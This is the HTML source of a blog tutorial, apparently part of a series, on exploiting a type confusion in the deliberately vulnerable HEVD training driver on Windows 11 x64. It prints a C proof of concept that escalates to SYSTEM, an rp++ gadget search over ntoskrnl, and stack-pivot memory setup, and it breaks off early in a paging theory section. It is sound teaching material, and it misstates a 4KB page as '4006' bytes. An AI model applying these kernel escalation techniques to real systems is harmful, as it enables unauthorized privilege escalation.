@@ -1,0 +1,662 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>0x06 - Approaching Modern Windows Kernel Type Confusions // </title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0x06 - Approaching Modern Windows Kernel Type Confusions">
+  <meta name="twitter:description" content="In the last tutorial we exploited a Type Confusion within the Windows 7 (x86) Kernel. Having obtained a solid foundation on approaching this vulnerability, we can now proceed to attempt exploitation on Windows 11 (x64).
+Table of Contents Reverse Engineering Writing the Exploit Plan of Attack The Start of Suffering Thoery General Memory Operations Virtual Memory Paged Memory Summary Exploitation Sources Reverse Engineering Let’s take a look at the vulnerable handler and respective structures.">
+
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x06-approaching-modern-windows-kernel-type-confusions/">
+  <meta property="og:site_name" content="wetw0rk">
+  <meta property="og:title" content="0x06 - Approaching Modern Windows Kernel Type Confusions">
+  <meta property="og:description" content="In the last tutorial we exploited a Type Confusion within the Windows 7 (x86) Kernel. Having obtained a solid foundation on approaching this vulnerability, we can now proceed to attempt exploitation on Windows 11 (x64).
+Table of Contents Reverse Engineering Writing the Exploit Plan of Attack The Start of Suffering Thoery General Memory Operations Virtual Memory Paged Memory Summary Exploitation Sources Reverse Engineering Let’s take a look at the vulnerable handler and respective structures.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-01-18T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
+      <span class="app-header-title"></span>
+      <p> </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">0x06 - Approaching Modern Windows Kernel Type Confusions</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Jan 18, 2025
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          15 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>In the <a href="https://wetw0rk.github.io/posts/0x05-introduction-to-windows-kernel-type-confusion-vulnerabilities/">last tutorial</a> we exploited a Type Confusion within the Windows 7 (x86) Kernel. Having obtained a solid foundation on approaching this vulnerability, we can now proceed to attempt exploitation on Windows 11 (x64).</p>
+<h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#reverse-engineering">Reverse Engineering</a></li>
+<li><a href="#writing-the-exploit">Writing the Exploit</a>
+<ul>
+<li><a href="#plan-of-attack">Plan of Attack</a></li>
+<li><a href="#the-start-of-suffering">The Start of Suffering</a></li>
+</ul>
+</li>
+<li><a href="#thoery">Thoery</a>
+<ul>
+<li><a href="#general-memory-operations">General Memory Operations</a></li>
+<li><a href="#virtual-memory">Virtual Memory</a></li>
+<li><a href="#paged-memory-summary">Paged Memory Summary</a></li>
+</ul>
+</li>
+<li><a href="#exploitation">Exploitation</a></li>
+<li><a href="#sources">Sources</a></li>
+</ul>
+<h1 id="reverse-engineering">Reverse Engineering</h1>
+<p>Let&rsquo;s take a look at the vulnerable handler and respective structures.</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/decompiled_code.png" alt="alt text"></p>
+<p>We cannot ignore that we have a lot of background information (not to mention symbols). The only real difference we need to account for is the fact that the allocation will be 16 (0x10) bytes. This is because of the size of an unsigned long in an x64 environment.</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/decompiled_code2.png" alt="alt text"></p>
+<p>That said, we can begin writing the proof of concept.</p>
+<h1 id="writing-the-exploit">Writing the Exploit</h1>
+<p>Below is a PoC we can begin working with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define TYPE_CONFUSION 0x222023
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Type Confusion */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USER_TYPE_CONFUSION_OBJECT {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ObjectId;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ObjectType;
+</span></span><span style="display:flex;"><span>} USER_TYPE_CONFUSION_OBJECT, <span style="color:#f92672">*</span>PUSER_TYPE_CONFUSION_OBJECT;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GetKernelModuleBase():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Function used to obtain kernel module address */</span>
+</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">GetKernelModuleBase</span>(PCHAR pKernelModule)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> pcDriver[<span style="color:#ae81ff">1024</span>]    <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>  LPVOID lpvTargetDriver <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpvDrivers     <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  DWORD dwCB             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwDrivers        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD i                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, dwCB, <span style="color:#f92672">&amp;</span>dwCB);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwCB <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvDrivers <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwCB <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(LPVOID));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvDrivers <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(lpvDrivers, dwCB, <span style="color:#f92672">&amp;</span>dwCB))
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    dwDrivers <span style="color:#f92672">=</span> dwCB <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(LPVOID);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDrivers; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseNameA</span>(lpvDrivers[i], pcDriver, <span style="color:#66d9ef">sizeof</span>(pcDriver)))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pcDriver, pKernelModule) <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>          lpvTargetDriver <span style="color:#f92672">=</span> lpvDrivers[i];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(lpvDrivers);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> lpvTargetDriver;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Type Confusion */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD dwBytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  LPVOID lpvNtKrnl <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  LPVOID lpvAllocation <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>  USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvNtKrnl <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelModuleBase</span>(<span style="color:#e6db74">&#34;ntoskrnl&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvNtKrnl <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to obtain the base address of nt</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Obtained the base address of nt: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvNtKrnl);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  lpvAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
+</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x1000</span>,
+</span></span><span style="display:flex;"><span>                               (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                               PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvAllocation <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(lpvAllocation, <span style="color:#e6db74">&#39;C&#39;</span>, <span style="color:#ae81ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectId <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectType <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242424242424242</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering Type Confusion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
+</span></span><span style="display:flex;"><span>                  TYPE_CONFUSION,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>UserTypeConfusionObject,
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(UserTypeConfusionObject),
+</span></span><span style="display:flex;"><span>                  NULL,
+</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
+</span></span><span style="display:flex;"><span>                  NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Exploitation successful, enjoy the shell!!</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">CloseHandle</span>(hHEVD);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="plan-of-attack">Plan of Attack</h2>
+<p>Once ran, we can see we will have successfully gotten control over execution flow.</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/crash.png" alt="alt text"></p>
+<p>We can see that the <strong>RBX</strong> register points to our object / structure. My thought here is we can perform a stack pivot into an allocation we control from userland (e.g VirtualAlloc).</p>
+<h2 id="the-start-of-suffering">The Start of Suffering</h2>
+<p>Let&rsquo;s look for gadgets, we&rsquo;ll be using our favorite tool <a href="https://github.com/0vercl0k/rp">rp++</a>, by <a href="https://github.com/0vercl0k">0vercl0k</a>.</p>
+<pre tabindex="0"><code>C:\&gt;rp-win.exe --rop=20 --va=0 --file C:\Windows\System32\ntoskrnl.exe &gt; rop.txt
+</code></pre><p>Being that this is a large file, let&rsquo;s move it over to Linux. If you plan to parse the output using grep, you&rsquo;re going to need to convert this file to ASCII.</p>
+<pre tabindex="0"><code>$ file rop.txt
+rop.txt: Unicode text, UTF-16, little-endian text, with very long lines (388), with CRLF line terminators
+
+$ iconv -f utf-16 -t us-ascii//TRANSLIT rop.txt &gt; rop_ascii.txt      
+</code></pre><p>At this point I was utterly confused since things were not going as planned. I checked out <a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-type-confusion/">VulnDevs blog</a> to see what he would have done and he used a fairly intresting gadget.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>QWORD STACK_PIVOT_GADGET <span style="color:#f92672">=</span> ntBase <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x317f70</span>; <span style="color:#75715e">// mov esp, 0x48000000; add esp, 0x28; ret; 
+</span></span></span></code></pre></div><p>I had never seen a gadget like this nor, did I know this was even possible&hellip; there&rsquo;s a few things we have to keep in mind when using a gadget like this.</p>
+<ol>
+<li>The address needs to be aligned (address % 16 == 0)</li>
+<li>We must give leeway room for the kernel to read/write to this area in memory (target_address - 0x1000)</li>
+<li>We must lock the memory region using VirtualLock</li>
+</ol>
+<p>The following code does just that.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* We&#39;re going to be allocating memory at 0xF6C875C0-0x1000, we must do this to give
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     the kernel room to read/write to this memory region */</span>
+</span></span><span style="display:flex;"><span>  lpvAllocTarget <span style="color:#f92672">=</span> (LPVOID)<span style="color:#ae81ff">0xF6C875C0</span>;
+</span></span><span style="display:flex;"><span>  lpvAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>((lpvAllocTarget <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>),
+</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x5000</span>,
+</span></span><span style="display:flex;"><span>                               (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
+</span></span><span style="display:flex;"><span>                               PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvAllocation <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* We lock the allocated memory region into RAM to avoid a page fault */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">VirtualLock</span>(lpvAllocation, <span style="color:#ae81ff">0x5000</span>) <span style="color:#f92672">==</span> FALSE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to lock virtual address space</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Successfully locked 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvAllocation);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlFillMemory</span>((LPVOID)lpvAllocTarget, <span style="color:#ae81ff">0x4000</span>, <span style="color:#e6db74">&#39;A&#39;</span>);
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectType <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)lpvNtKrnl <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x32e4fe</span>; <span style="color:#75715e">// mov esp, 0xF6C875C0 ; ret
+</span></span></span></code></pre></div><p>Once sent, we DON&rsquo;T have a successful pivot&hellip;</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/pivot.png" alt="alt text"></p>
+<p>If we analyze this we get a double fault&hellip;</p>
+<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/double_fault.png" alt="alt text"></p>
+<p>At this point a month passed and I was getting nowhere&hellip; I mean nowhere&hellip; until I came across a blog by <a href="https://wafzsucks.medium.com/how-a-simple-k-typeconfusion-took-me-3-months-long-to-create-a-exploit-f643c94d445f">wafzsucks</a> and ultimately it came down to breakpoints breaking the exploit.</p>
+<p>Once I removed my breakpoint everything worked?</p>
+<h1 id="thoery">Thoery</h1>
+<p>Although I had a working exploit at this point I wanted to understand why - so I decide to walk though <strong>wafzsucks</strong> blog :)</p>
+<p>What follows in this section are mostly the notes of <strong>wafzsucks</strong> I wanna make sure I make that clear. However since writing notes is the way I learn I decided to write my understanding as I go.</p>
+<h2 id="general-memory-operations">General Memory Operations</h2>
+<p>Based on information from <a href="https://en.wikipedia.org/wiki/Kernel_(operating_system)">Wikipedia</a> the kernel has full access to the the systems memory. It&rsquo;s responsible for allowing processes to access memory as it&rsquo;s required. This is done via virtual addressing (via paging and/or segmentation).</p>
+<p>According to <a href="https://en.wikipedia.org/wiki/Memory_paging">Wikipedia</a> when using this scheme (paging) the OS gets information in blocks called pages. For example in Windows a page is 4KB (4006 or 0x1000 bytes).</p>
+<p>What virtual addressing is doing is allowing the kernel to make a given physical address appear to be another address, the virtual address.</p>
